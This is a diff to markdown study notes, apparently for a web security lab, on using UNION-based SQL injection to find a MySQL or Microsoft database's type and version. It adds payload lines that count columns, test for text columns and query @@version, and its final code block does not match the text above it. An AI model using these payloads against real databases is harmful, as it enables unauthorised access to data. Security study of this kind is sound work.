@@ -56,9 +56,34 @@ We see both columns contain text values, so now the end challenge is to display 
 
 ### SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-Similar methodology steps as the above UNION for Oracle but with # as the comment
+Similar methodology steps as the above UNION for Oracle but with # as the comment, we stop at 2 but add additional NULLs if you still get 500 internal errors
 
 ```
 ' UNION SELECT NULL#
 ' UNION SELECT NULL,NULL#
 ```
+
+To check for text in columns
+
+```
+' UNION SELECT 'abc',NULL#
+' UNION SELECT NULL,'abc'#
+```
+
+
+To solve just add @@version to the columns above
+
+```
+' UNION SELECT NULL,NULL#
+```
+
+
+
+
+
+
+
+
+
+
+
